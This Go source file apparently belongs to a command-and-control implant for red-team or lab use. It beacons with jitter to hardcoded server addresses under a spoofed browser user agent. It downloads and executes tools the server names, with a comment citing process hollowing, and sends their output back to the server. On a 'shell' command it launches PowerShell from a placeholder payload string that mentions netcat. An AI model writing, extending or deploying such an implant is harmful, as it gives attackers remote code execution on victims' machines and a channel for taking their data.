package main

import (
	"math/rand"
	"time"
	"proj-63/beacon"
	"projt-63/downloader"
	"fmt"
	"os/exec"

)

const uu = "http://10.10.10.10:999"
const O_url = "http://10.10.10.10:999/out-var"
const url = "http://10.10.14.10:999/command-var"
const agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) Firefox/47.0"
const offset = 7 
const base = 0    
const sleep = 1   
const ss = "ss"
const yy = "post"



func runPS(cmd string) error {

	c := exec.Command("powershell", cmd)

	return c.Start()


}



func main() {
	
	sysid := "uuid"
	checkIn := time.Now()
	beaco := beacon.NewHttpAuthBeacon(sysid, url, agent, yy)
	downloader := downloader.NewHttpDownloader(agent)

	for {
		if checkIn.Before(time.Now()) {
			url, args := beaco.Beacon()

			if url != "" {
        //
				shell := fmt.Sprintf("%s/shell", uu)
				if (url != shell){
					// to inject tools [process hollowing]
					output := downloader.DownloadExec(url, args)
					//tool output
					beacon.NewHttpAuthBeacon(output, O_url, agent, ss)
				}else{

					//for testing
					cmdd := ("PUT A POWERHELL PAYLOAD FOR NETCAT OR WHATEVER")
					runPS(cmdd)
				}
			}

			checkIn = updateCheckinTime()
		}

		time.Sleep(sleep * time.Second)
	}

}


func updateCheckinTime() time.Time {
	t := time.Now()
	base := time.Duration(base) * time.Hour
	jitter := time.Duration(rand.Intn(offset)) * time.Second

	return t.Add(base).Add(jitter)
}
